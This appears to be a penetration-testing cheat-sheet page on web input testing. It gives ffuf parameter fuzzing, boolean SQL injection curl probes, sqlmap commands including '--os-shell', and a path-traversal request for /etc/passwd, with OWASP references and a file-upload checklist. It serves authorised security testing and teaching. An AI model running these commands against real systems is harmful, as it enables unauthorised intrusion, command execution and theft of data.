---
title: Web input tests
order: 2
tags: [web, sqli, lfi, upload, parameters]
---

## Parameter discovery

Replace /page with an observed route; params.txt contains candidate parameter names.

```bash
ffuf -w params.txt -u 'http://{{RHOST}}:{{RPORT}}/page?FUZZ=1' -ac
```

Confirm the parameter changes app behavior before testing it further. [Source](https://github.com/ffuf/ffuf).

## SQL injection comparison

Adapt /item and id to the observed numeric input. Compare baseline, true and false conditions with the same session.

```bash
curl -i 'http://{{RHOST}}:{{RPORT}}/item?id=1'
curl -i 'http://{{RHOST}}:{{RPORT}}/item?id=1%20AND%201=1'
curl -i 'http://{{RHOST}}:{{RPORT}}/item?id=1%20AND%201=2'
```

A difference is a lead. Repeat and establish a consistent SQL-dependent result before claiming injection. TODO: verify query context and DBMS before choosing further payloads. [OWASP method](https://wstg.owasp.org/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection/), [request syntax](https://curl.se/docs/manpage.html).

## SQLMap

Save the browser request to req.txt, then enumerate and confirm:

```bash
sqlmap -r req.txt --dbs --level=3 --risk=2
sqlmap -r req.txt --os-shell
```

Higher levels add slower, rarer tests. On MSSQL with stacked queries, `--os-shell` drives [xp_cmdshell](services/databases#mssql-command-execution); match the DBMS from fingerprinting first. [SQLMap usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage), [request file](https://github.com/sqlmapproject/sqlmap/wiki/FAQ#how-can-i-use-a-burpsuite-saved-request-file).

## Local file inclusion

Adapt the route and file parameter to an observed file-selection feature on a Unix-like target.

```bash
curl -i 'http://{{RHOST}}:{{RPORT}}/preview.php?file=../../../../etc/passwd'
```

Confirm returned file content. Required traversal depth and application-added suffixes vary. [OWASP LFI testing](https://wstg.owasp.org/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion/).

## File upload checks

- [ ] Identify the real upload field, accepted types and authentication requirements.
- [ ] Submit a prepared test file and inspect the response.
- [ ] Verify storage and retrieval separately; HTTP 200 proves neither.
- [ ] Check the served content type and whether server-side execution is actually possible.

TODO: verify the app's upload route, field and file-handling behavior before preparing a copy-ready request. [OWASP upload testing](https://wstg.owasp.org/v4.2/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types/).
